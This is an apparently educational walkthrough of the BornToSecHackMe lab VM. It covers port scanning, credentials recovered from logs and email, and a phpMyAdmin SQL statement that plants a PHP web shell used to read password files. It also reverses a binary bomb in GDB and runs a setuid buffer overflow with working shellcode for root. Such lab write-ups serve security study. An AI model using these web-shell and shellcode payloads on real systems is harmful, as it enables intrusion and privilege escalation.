First let's find the IP address of the VM.

Launching vmnetcfg.exe we see that the VM will broadcast on a range of IP which is between 192.168.134.124 to 192.168.134.254
So let's run nmap 192.168.134.124-254

----------
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-24 13:42 Paris, Madrid
Nmap scan report for 192.168.134.128
Host is up (0.0020s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
MAC Address: 00:0C:29:F8:6D:10 (VMware)

Nmap scan report for 192.168.134.254
Host is up (0.00s latency).
All 1000 scanned ports on 192.168.134.254 are filtered
MAC Address: 00:50:56:E0:D1:02 (VMware)

Nmap done: 132 IP addresses (2 hosts up) scanned in 6.87 seconds
----------

We see the VM is on the address 192.164.134.128 and we see a bunch of services runing.

Runing a Kali Linux we found some routes available like:
nikto -h 192.168.158.128:443
[...]
+ OSVDB-3092: /forum/: This might be interesting...
[...]
+ OSVDB-3093: /webmail/: SquirrelMail found
[...]
+ /phpmyadmin/: phpMyAdmin directory found
[...]

They are only accessible with https


We found on the forum a post named "Probleme login?" which is a huge dump of logs posted by lmezard
We found here an intersting line :

--------
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
--------

It seems like the user gave his password as the username by mistake. So thanks to him we have his password.
We found that this password works to log in the forum with the username lmezard.
Nothing very intersting there except that we now know his mail address which is : laurie@borntosec.net
It is written in the Edit Profile area.

Now let's go on https://<ip>/webmail.

Let's try the email we found with the previous password.
Thanksfuly it works.
We see a very interesting email called DB Access:

---------
Hey Laurie,

You can connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
---------

Ok great we have now root credentials to connect to the DB. Let's see what we can find there.

Let's go on https://<ip>/phpmyadmin and log in with the credentials we have in the mail.

So let's do a basic SQL request to execute commandes on the server from the browser.

SELECT "<?php system($_GET['cmd']) ?>" into outfile "/var/www/forum/templates_c/exploit.php"

This is a simple request to create a file called exploit.php in the directory /var/www/forum/templates_c/ because we have write privilege there.
And it's a little piece of code that GET the parameter cmd and puts it in the function system()

https://192.168.134.128/forum/templates_c/exploit.php?cmd=pwd
/var/www/forum/templates_c

It works ! So now let's look around and see if we can find something relevent.

https://192.168.134.128/forum/templates_c/exploit.php?cmd=ls%20/home
LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz

https://192.168.134.128/forum/templates_c/exploit.php?cmd=ls%20/home/LOOKATME
password

https://192.168.134.128/forum/templates_c/exploit.php?cmd=cat%20/home/LOOKATME/password
lmezard:G!@M6f4Eatau{sF"

Ok we found a new password ! Again it's for the user lmezard.

We try to use it to connect on the server via ssh but it doesn't work.
But we found out this credentials work for the FTP connection.

We found a file call fun.
When we watch closer we understand it's a tarball file.
After unziping it we see a bunch of files.

We see in a file :
--------
	printf("M");
	printf("Y");
	printf(" ");
	printf("P");
	printf("A");
	printf("S");
	printf("S");
	printf("W");
	printf("O");
	printf("R");
	printf("D");
	printf(" ");
	printf("I");
	printf("S");
	printf(":");
	printf(" ");
	printf("%c",getme1());
	printf("%c",getme2());
	printf("%c",getme3());
	printf("%c",getme4());
	printf("%c",getme5());
	printf("%c",getme6());
	printf("%c",getme7());
	printf("%c",getme8());
	printf("%c",getme9());
	printf("%c",getme10());
	printf("%c",getme11());
	printf("%c",getme12());
	printf("\n");
	printf("Now SHA-256 it and submit");
  --------
  
  Now we need to find every return of getmeX() function to find the password.
  
 Using the search utils in our IDE we find the function getme1() but the end of the function is not there.
 But there is a comment with the number of the file. With the search utils we find the next file which is file Number + 1.
 In the end we find the string : "Iheartpwnage".
 We convert it in SHA256 => 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 Here we have credentials to connect to server with ssh with the user laurie.
 
After connecting in ssh we see 2 files. 1 executable and 1 README.
The README says when you get all password out of the bomb use them to log into thor.

Let's reverse each phase of the program with GDB.

Phase 1 :
(gdb) x/s 0x80497c0
0x80497c0:       "Public speaking is very easy."

Phase 2 :
Here it's the index of the number position multiplied by the previous number. And it starts with the number 1.

1
2 * 1 = 2
3 * 2 = 6
4 * 6 = 24
5 * 24 = 120
6 * 120 = 720
"1 2 6 24 120 720"

Phase 3 :
scanf and compare 3 values %d %c %d
Hints says 2nd value is b (0x62)
   0x08048c00 <+104>:   mov    $0x62,%bl
3rd value is d6 = 214
   0x08048c02 <+106>:   cmpl   $0xd6,-0x4(%ebp)
"1 b 214"

Phase 4:
We can see it scanf an int. We see it calls the func func4() which operate a calcule which is called recursivly.
It then compare its value to 55. If it's equal it is defused.
Throwing some random ints and checking in the register its value we finaly found the answer :
"9"

Phase 5:
Input must be 6 char long.

   0x08048d3b <+15>:	call   0x8049018 <string_length>
   0x08048d40 <+20>:	add    $0x10,%esp
   0x08048d43 <+23>:	cmp    $0x6,%eax

It uses the string "isrveawhobpnutfg" as a base to modify the string.
In the end it compares it with the string "giants"

(gdb) x/s 0x804980b
0x804980b:	 "giants"

i s r v e a w h o b p n u t f g

  a b c d e f g h i j k l m n o
p q r s t u v x y z

As you can see there is multiple answers : "opukmq", "opekmq", "opekma", "opukma".
But to match the hint and the password the final answer is : "opekmq"

Phase 6:
Here it waits for 6 numbers

   0x08048db3 <+27>:	call   0x8048fd8 <read_six_numbers>

Each numbers must be between 1 and 6.

In the program there is nodes with values associated.

(gdb) x/d 0x804b26c
0x804b26c <node1>:	253

[...]

(gdb) x/d 0x804b26c-0x3c
0x804b230 <node6>:	432

After getting all nodes values we see that the program check if they are in descending order.
In the end we find :
"4 2 6 3 1 5"


So here we have all our password BUT it doesn't work ...
After days trying to find why, there's a post on the forum saying :
"Apparently, in the old forum, people said that we have to switch len-2 and len-3 characters of the password."

So the final password for thor is :
"Publicspeakingisveryeasy.126241207201b2149opekmq426135"

There is a file call turtle that gives indication for a drawing.
In the end it spells the word "SLASH"
We need to hash it in md5 and it gives the password for zaz :
"646da671ca01bb5d84dbb5fb2238dc8e"

Here there's a program called exploit me. It has a setuid priviliege from root so if we open a shell from this program, it will have root access.
We see it's a very simple program with a strcpy of argv[1] into a string.
With a string pattern we find an offset of 140 with the return address.

We are going to inject a shellcode in the buffer which executes a shell and modify our return address so it points to our shellcode.
Filling the string a first time with "A" we see

(gdb) b *0x0804842c
Breakpoint 1 at 0x804842c
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /home/zaz/exploit_me AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x0804842c in main ()
(gdb) x/100x $sp
0xbffff640:	0xbffff650	0xbffff8bc	0x00000001	0xb7ec3c49
0xbffff650:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff660:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff670:	0x41414141	0x41414141	0x41414141	0x00000041
0xbffff680:	0xbffff8a7	0x0000002f	0xbffff6dc	0xb7fd0ff4
0xbffff690:	0x08048440	0x080496e8	0x00000002	0x080482dd

We see that "A"'s (0x41) starts at 0xbffff650.
We have a shellcode of 25 byte long.

 ./exploit_me $(python -c 'print("\x90" * 115 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x50\xf6\xff\xbf")')

Return address will jump into the NOPSLED to finally exec our shellcode

# whoami
root
